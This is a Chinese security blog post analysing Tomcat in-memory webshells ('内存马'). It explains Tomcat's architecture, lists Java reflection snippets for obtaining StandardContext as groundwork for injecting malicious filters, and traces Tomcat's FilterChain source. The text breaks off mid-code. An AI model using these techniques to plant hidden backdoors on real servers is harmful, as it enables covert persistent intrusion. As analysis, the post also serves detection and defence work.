<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Tomcat内存马 | Tyaoo's Blog</title><meta name="keywords" content="漏洞分析"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="浅析Tomcat内存马">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat内存马">
<meta property="og:url" content="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Tyaoo&#39;s Blog">
<meta property="og:description" content="浅析Tomcat内存马">
<meta property="og:locale">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-12-06T07:51:42.000Z">
<meta property="article:modified_time" content="2022-02-25T04:14:08.632Z">
<meta property="article:author" content="Tyaoo">
<meta property="article:tag" content="漏洞分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tomcat内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-25 12:14:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Tomcat内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-25T04:14:08.632Z" title="Updated 2022-02-25 12:14:08">2022-02-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tomcat内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>浅析Tomcat内存马</p>
</blockquote>
<span id="more"></span>

<h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419010d17901dd228b3521a27.png" alt="image-20211202025149726" style="zoom:80%;" />

<ol>
<li>部署描述文件中由<code>&lt;listener&gt;</code>元素标记的事件监听器会被创建和初始化，事件监听器如果实现了<code>ServletContextListener</code>接口，将会调用其实现的<code>contextInitialized()</code>方法</li>
<li>部署描述文件中由<code>&lt;filter&gt;</code>元素标记的过滤器会被创建和初始化，并调用其<code>init()</code>方法，每一次请求时都只调用<code>doFilter()</code>方法进行处理</li>
<li>部署描述文件中由<code>&lt;servlet&gt;</code>元素标记的<code>Servlet</code>会根据<code>&lt;load-on-startup&gt;</code>的权值按顺序创建和初始化，并调用其<code>init()</code>方法，<code>Servlet</code>一旦被装入到Web容器之后，一般会长久驻留，直到Web容器停止运行或重新装入<code>Servlet</code>时结束生命周期，<code>Servlet</code>在第一次访问之后都只调用<code>doGet()</code>或<code>doPost()</code>方法</li>
</ol>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat体系结构"><a href="#Tomcat体系结构" class="headerlink" title="Tomcat体系结构"></a>Tomcat体系结构</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041900df05d576da5041783ccd.png" alt="image-20211201195720058" style="zoom: 50%;" />

<ul>
<li><strong>Server</strong>：表示一个Tomcat实例（单例），即整个catalina servlet容器，主要是用来管理容器下各个Serivce组件的生命周期</li>
<li><strong>Service</strong>：一组提供服务、处理请求的组件，将一组Connector组件和Engine关联了起来</li>
<li><strong>Connector</strong>：客户端连接到Tomcat容器的服务点，它为Engine提供协议服务，并根据Engine与客户端通讯的协议类型进行隔离，如HTTP、HTTPS、AJP协议</li>
<li><strong>Container</strong>：Container是容器的父接口，用于封装和管理Servlet，以及处理Request请求，它包含了四大请求处理组件：Engine、Host、Context和Wrapper</li>
<li><strong>Engine</strong>：Service中的请求处理组件，包含了Servlet容器的核心功能，主要负责将传入请求委托给适当的Host处理</li>
<li><strong>Host</strong>：虚拟主机，每个Host会与某个网络域名相匹配，负责运行多个Web Application，每个Web Application对应一个Context，负责将收到的请求匹配到对应的Context，匹配的方法为“最长匹配”</li>
<li><strong>Context</strong>：一个Contenxt代表一个Web Application，具备了Servlet运行的基本环境</li>
<li><strong>Wrapper</strong>：最底层的容器，一个Wrapper代表一个Servlet，负责Servlet的装载、初始化、执行和资源回收</li>
</ul>
<h3 id="Tomcat组件关系"><a href="#Tomcat组件关系" class="headerlink" title="Tomcat组件关系"></a>Tomcat组件关系</h3><ul>
<li>一个Server包含一个或多个Service</li>
<li>一个Service包含多个Connector和一个Container</li>
<li>一个Container只能包含一个Engine</li>
<li>一个Engine包含一个或多个Host</li>
<li>一个Host包含一个或多个Web Application</li>
<li>一个Context表示一个运行着Tomcat实例的Web Application</li>
<li>一个Web Application包含一个或多个Wrapper</li>
<li>一个Wrapper表示一个Servlet</li>
<li>Engine、Host、Context和Wrapper是显现了Container接口的容器</li>
</ul>
<h3 id="Tomcat执行流程"><a href="#Tomcat执行流程" class="headerlink" title="Tomcat执行流程"></a>Tomcat执行流程</h3><p><strong>客户端和服务端交互过程</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20211204190156f5ecc16735b1e97e53.png" alt="image-20211201195745765" style="zoom:50%;" />

<p><strong>请求数据流图</strong></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041901cc740176246a7b512a0c.png" alt="image-20211201204202339" style="zoom: 67%;" />

<p><strong>Pipeline调用链</strong></p>
<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211202153946928.png" alt="image-20211202153946928" style="zoom:50%;" />

<ul>
<li><code>Connector</code>在某个指定的端口上来监听客户端发来的请求</li>
<li><code>Connector</code>使用<code>ProtocolHandler</code>处理器处理收到的请求，<code>ProtocolHandler</code>处理器共有三个组件<ul>
<li><code>Endpoint</code>负责接受，处理<code>socket</code>网络连接（<code>Executor</code>提供多线程操作）</li>
<li><code>Processor</code>根据协议类型封装成<code>Request</code></li>
<li><code>Adapter</code>负责将封装好的<code>Request</code>交给<code>Container</code>进行处理</li>
</ul>
</li>
<li><code>Container</code>使用<code>Pipeline-valve</code>管道处理请求，每个 <code>Pipeline</code> 都有一个最后执行的、不可删除的 <code>BasicValve</code>，通常命名为<code>Standard(xxx)Valve</code>，如上图所示，上层容器<code>valve</code>调用下层<code>valve</code>形成链式结构<ul>
<li><code>EnginePipeline</code>：<code>EngineValve1</code> -&gt; … -&gt;<code>StandardEngineValve</code></li>
<li><code>HostPipeline</code>：<code>HostValve1</code> -&gt; … -&gt;<code>StandardHostValve</code></li>
<li><code>ContextPipeline</code>：<code>ContextValve1</code> -&gt; … -&gt;<code>StandardContextValve</code></li>
<li><code>WrapperPipeline</code>：<code>WrapperValve1</code> -&gt; … -&gt;<code>StandardWrapperValve</code></li>
</ul>
</li>
<li>创建<code>FilterChain</code>，如果一个<code>URL</code>对应多个<code>Filter</code>则进行链式调用</li>
<li>最终由<code>Servlet</code>处理请求，并将处理的结果返回给<code>Connector</code></li>
<li><code>Connector</code>把响应回传给客户端</li>
</ul>
<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>StandardContext</code>是<code>Context</code>的实现类，涵盖了<code>Web Application</code>的启动流程，包括使用<code>WebResourceRoot</code>加载资源文件、利用<code>Loader</code>加载<code>class</code>，使用<code>JarScanner</code>扫描，实例化<code>Sesssion</code>管理器，初始化各种<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>等功能</p>
<p>以下讲到的内存马都是基于修改<code>StandardContext</code>实现的，所以如何获取<code>StandardContext</code>也是内存马实现的重点之一</p>
<p><strong>获取方法</strong></p>
<p>目前<code>StandardContext</code>获取的方式有以下几种：</p>
<ol>
<li><p>从<code>request</code>对象反射出<code>ApplicationContext</code>，再反射出<code>StandardContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
</li>
<li><p>从<code>ThreadLocal</code>中获取<code>request</code></p>
<blockquote>
<p>Tomcat 7、8、9</p>
</blockquote>
<p>参考<strong>@threedr3am</strong>师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">文章</a></p>
</li>
<li><p>从<code>ContextClassLoader</code>中获取</p>
<blockquote>
<p>Tomcat 8、9</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历<code>thread</code>数组获取包含<code>StandardContext</code>的类，其中<code>Acceptor</code>为全版本<code>tomcat</code>都有</p>
<blockquote>
<p>Tomcat 6、7、8、9</p>
</blockquote>
<p>参考<strong>@bitterz</strong>师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">文章</a>，比如下面方法就能够拿到<code>/manager</code>下的<code>StandardContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread[] threads = (Thread[]) <span class="built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">threads[<span class="number">3</span>] ==&gt; Thread[ContainerBackgroundProcessor[StandardEngine[Catalina]],<span class="number">5</span>,main]</span><br><span class="line"></span><br><span class="line">threads[<span class="number">3</span>].target.<span class="built_in">this</span>$<span class="number">0.</span>children.values.toArray()[<span class="number">0</span>].children.get(<span class="string">&quot;/manager&quot;</span>)</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>前面提到，当<code>StandardWrapperValve</code>执行完后就会创建<code>FilterChain</code>，所以<code>FilterChain</code>的入口位于<code>org/apache/catalina/core/StandardWrapperValve.java#invoke</code>函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">StandardWrapperValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); <span class="comment">// ==&gt; 创建FilterChain</span></span><br><span class="line"></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">            <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain) req.getFilterChain(); <span class="comment">// ==&gt; 初始化一个空的FilterChain</span></span><br><span class="line">                <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet); <span class="comment">// ==&gt; 设置Servlet</span></span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent(); <span class="comment">// ==&gt; 获取StandardContext</span></span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps(); <span class="comment">// ==&gt; 获取存储了所有filter的filterMaps，filterMaps位于StandardContext的filterMaps属性中</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> filterChain;</span><br><span class="line"></span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); <span class="comment">// ==&gt; 获取调度类型为&quot;REQUEST&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">        <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">            requestPath = attribute.toString(); <span class="comment">// ==&gt; 获取请求的URL路径</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName(); <span class="comment">// ==&gt; 获取Servlet的名字</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123; <span class="comment">// ==&gt; 匹配调度的指令，即&quot;REQUEST&quot;</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersURL(filterMap, requestPath)) <span class="comment">// ==&gt; 根据Filter的URLPattern匹配请求的URL</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName()); <span class="comment">// ==&gt; 初始化filterConfig，此处的filterDef封装了我们的Filter，filterConfigs以键值对的方式存储在StandardContext中</span></span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig); <span class="comment">// ==&gt; 添加filterConfig到filterChain的filters数组中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) <span class="comment">// ==&gt; 匹配ServletName，但是filterMap默认的ServletName为空，所以全部跳过</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filterChain; <span class="comment">// ==&gt; 返回FilterChain</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再次回到<code>StandardWrapperValve</code>的<code>invoke()</code>函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">StandardWrapperValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        <span class="type">MessageBytes</span> <span class="variable">requestPathMB</span> <span class="operator">=</span> request.getRequestPathMB();</span><br><span class="line">        <span class="type">DispatcherType</span> <span class="variable">dispatcherType</span> <span class="operator">=</span> DispatcherType.REQUEST;</span><br><span class="line">        <span class="keyword">if</span> (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);</span><br><span class="line">        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,</span><br><span class="line">                requestPathMB);</span><br><span class="line">        <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span></span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); <span class="comment">// ==&gt; 创建FilterChain</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((servlet != <span class="literal">null</span>) &amp;&amp; (filterChain != <span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (context.getSwallowOutput()) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        SystemLogHandler.startCapture();</span><br><span class="line">                        <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                            request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.doFilter(request.getRequest(),</span><br><span class="line">                                    response.getResponse());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> SystemLogHandler.stopCapture();</span><br><span class="line">                        <span class="keyword">if</span> (log != <span class="literal">null</span> &amp;&amp; log.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            context.getLogger().info(log);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (request.isAsyncDispatching()) &#123;</span><br><span class="line">                        request.getAsyncContextInternal().doInternalDispatch();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterChain.doFilter</span><br><span class="line">                            (request.getRequest(), response.getResponse()); <span class="comment">// ==&gt; 调用ApplicationFilterChain的doFilter()函数</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">                            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException)</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException)</span><br><span class="line">                    <span 